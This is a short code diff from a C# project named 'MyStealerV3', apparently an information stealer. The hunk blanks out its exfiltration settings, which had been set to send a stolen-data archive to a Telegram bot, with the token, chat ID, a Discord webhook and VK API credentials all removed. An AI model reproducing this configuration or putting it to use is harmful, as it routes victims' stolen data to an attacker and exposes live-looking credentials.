@@ -55,14 +55,14 @@ namespace MyStealerV3
         public const sendMethods sendMethod = sendMethods.Telegram; // Куда кидать архив
 
         //telegram
-        public const string TelegramToken = "5315291273:AAFiCQnpXXVeK3OzJk3qJCR7lHNfrmSH9X0";
-        public const int TelegramChatID = 1017254880;
+        public const string TelegramToken = "";
+        public const int TelegramChatID = 0;
 
         //discord
-        public const string DiscordWebHook = "https://discord.com/api/webhooks/988762738253778964/alr_OACHYc1CuDoSeg9lHACdP9XE83JFIooms2q_n04-DKclmDJnLD06XA2F0J4HK16o";
+        public const string DiscordWebHook = "";
 
         //vkontakte
-        public const string VkApiToken = "6584392fb499dc96b0506457977787caf66b4c37852fa03d531b2539bdb98ef7a85a09a5623c85d8c804e";
-        public const int VkUserID = 395816914;
+        public const string VkApiToken = "";
+        public const int VkUserID = 0;
     }
 }
